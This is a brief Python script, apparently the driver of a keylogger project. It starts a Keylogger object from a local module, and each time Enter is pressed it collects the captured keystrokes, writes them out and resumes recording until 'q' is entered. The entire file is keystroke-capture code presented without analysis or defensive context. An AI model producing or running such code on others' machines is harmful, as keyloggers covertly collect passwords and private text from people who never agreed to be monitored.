import keyboard
import keylogger

def restartWrittenKeys(keylogger_instance):
    stoppedRecording = keylogger_instance.stopRecording()
    keysPressed = keylogger_instance.getTypedStrings(stoppedRecording)
    keylogger_instance.writeKeysPressed(keysPressed)
    keylogger_instance.startRecording()

def main():

    keylogger_instance = keylogger.Keylogger()

    keylogger_instance.startRecording()

    while True:
        keyboard.wait('enter')
        restartWrittenKeys(keylogger_instance)
        if input() == "q":
            break


main()
